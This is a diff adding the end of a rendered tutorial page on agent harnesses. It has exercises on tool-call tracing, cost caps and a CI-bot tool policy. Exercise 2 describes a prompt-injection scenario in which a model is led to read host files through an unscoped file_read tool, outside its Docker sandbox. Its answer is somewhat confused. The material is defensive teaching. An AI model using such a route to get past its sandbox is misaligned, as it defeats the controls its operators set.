+<li>[ ] I can assemble a harnessed loop that combines budget gates, circuit breakers, and tool dispatch</li>
+<li>[ ] I can define role-based policies that restrict tool access per agent</li>
+<li>[ ] I can explain why cost caps and rate limits are required in production</li>
+</ul>
+<hr />
+<h2 id="wrapping-up">Wrapping up<a class="headerlink" href="#wrapping-up" title="Permanent link">&para;</a></h2>
+<p>This section built the execution layer that turns a language model from a text generator into an agent. Tool-calling provides structured access to the outside world. Sandboxes ensure that access is safe. The harness pattern — budget gates from Section 2.3, orchestration from Section 4.2, tool dispatch, and sandboxed execution — is the architecture that every production agent uses.</p>
+<p>The next section will examine how hyperscaler platforms (AWS Bedrock, Azure AI, GCP Vertex) package this pattern as managed services, shifting the build-vs-buy decision for teams that need agents at scale.</p>
+<h2 id="retrieval-practice">Retrieval practice<a class="headerlink" href="#retrieval-practice" title="Permanent link">&para;</a></h2>
+<h3 id="exercise-1-trace-the-protocol">Exercise 1 — Trace the protocol<a class="headerlink" href="#exercise-1-trace-the-protocol" title="Permanent link">&para;</a></h3>
+<p>Draw the sequence of messages (user, assistant, tool) for an agent that: (a) reads <code>config.yaml</code>, (b) changes the port from 8080 to 9090, (c) writes the file back, and (d) runs <code>python -m pytest</code> to verify. How many tool calls are involved?</p>
+<details><summary>Answer</summary>
+
+Four tool calls minimum:
+
+1. `file_read(path="config.yaml")` → returns file content
+2. Model edits content in its response
+3. `file_write(path="config.yaml", content=<updated>)` → returns "OK"
+4. `shell_exec(command="python -m pytest")` → returns test output
+
+The model may add a fifth `file_read` to verify the write. Total messages: 1 user + ~8 assistant/tool pairs + 1 final assistant = ~10 messages.
+
+</details>
+
+<h3 id="exercise-2-sandbox-escape-analysis">Exercise 2 — Sandbox escape analysis<a class="headerlink" href="#exercise-2-sandbox-escape-analysis" title="Permanent link">&para;</a></h3>
+<p>Your sandbox uses <code>docker run --rm --network=none</code>. An attacker crafts a prompt that makes the model generate code which writes a file to <code>/tmp/exfil.txt</code> and then the <em>next</em> tool call uses <code>file_read("/tmp/exfil.txt")</code> to read it from the host. Does the sandbox prevent this? Why or why not?</p>
+<details><summary>Answer</summary>
+
+**No, the sandbox does not prevent this.** The Docker container's `/tmp` is isolated from the host `/tmp`, so the file written *inside* the container disappears when the container exits (`--rm`). However, if the harness's `file_read` tool runs on the *host* (not in the sandbox), the attacker could read host files via `file_read`. The fix: route sensitive read operations through the sandbox too, or use an allowlist of readable paths. This is why capability-based permissions (loop 5) matter — `file_read` should be scoped to the project directory.
+
+</details>
+
+<h3 id="exercise-3-cost-cap-calculation">Exercise 3 — Cost cap calculation<a class="headerlink" href="#exercise-3-cost-cap-calculation" title="Permanent link">&para;</a></h3>
+<p>An agent uses GPT-4 Turbo at $0.01 per 1K input tokens and $0.03 per 1K output tokens. Each harness iteration uses ~2K input tokens and ~500 output tokens. The task requires an estimated 15 iterations. What cost cap should you set, and what margin would you add?</p>
+<details><summary>Answer</summary>
+
+Per iteration: (2000/1000 × $0.01) + (500/1000 × $0.03) = $0.02 + $0.015 = $0.035. For 15 iterations: 15 × $0.035 = $0.525. Add a 50% margin for retries and unexpected loops: $0.525 × 1.5 = **$0.79, round up to $0.80**. Setting the cap at $1.00 gives comfortable headroom while preventing the $10+ bills that runaway loops produce.
+
+</details>
+
+<h3 id="exercise-4-design-a-policy">Exercise 4 — Design a policy<a class="headerlink" href="#exercise-4-design-a-policy" title="Permanent link">&para;</a></h3>
+<p>Define an <code>AgentPolicy</code> for a <strong>CI bot</strong> that can read any file, run tests, and post comments, but must never write source files or push to git. What <code>allowed_tools</code> set would you use? What <code>max_cost_usd</code> is reasonable for a CI run?</p>
+<details><summary>Answer</summary>
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">CI_BOT</span> <span class="o">=</span> <span class="n">AgentPolicy</span><span class="p">(</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    <span class="n">allowed_tools</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;file_read&quot;</span><span class="p">,</span> <span class="s2">&quot;shell_exec&quot;</span><span class="p">,</span> <span class="s2">&quot;post_comment&quot;</span><span class="p">},</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    <span class="n">max_cost_usd</span><span class="o">=</span><span class="mf">0.50</span><span class="p">,</span>       <span class="c1"># CI runs should be cheap</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    <span class="n">max_tokens_per_minute</span><span class="o">=</span><span class="mi">20_000</span><span class="p">,</span>  <span class="c1"># higher for test output parsing</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>    <span class="n">max_tool_calls_per_minute</span><span class="o">=</span><span class="mi">60</span><span class="p">,</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>    <span class="n">tool_timeout_s</span><span class="o">=</span><span class="p">{</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>        <span class="s2">&quot;file_read&quot;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>        <span class="s2">&quot;shell_exec&quot;</span><span class="p">:</span> <span class="mi">120</span><span class="p">,</span>   <span class="c1"># tests can take time</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>        <span class="s2">&quot;post_comment&quot;</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>    <span class="p">},</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="p">)</span>
+</code></pre></div>
+
+Key exclusions: `file_write` (no source modification), `git_push` (no repo mutation). The `shell_exec` timeout is higher because test suites can be slow. Cost cap of $0.50 is generous for a single CI run — if it needs more, the task should be split.
+
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../part2/4.3%20Refactoring%20the%20Past%20Legacy%20C%2B%2B%20via%20Agentic%20Threads/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 4.3 Refactoring the Past: Legacy C++ via Agentic Threads">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                4.3 Refactoring the Past: Legacy C++ via Agentic Threads
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../5.2%20OpenRouter%20The%20Switzerland%20of%20the%20Model%20Wars/" class="md-footer__link md-footer__link--next" aria-label="Next: 5.2 OpenRouter: The Switzerland of the Model Wars">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                5.2 OpenRouter: The Switzerland of the Model Wars
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "toc.integrate", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
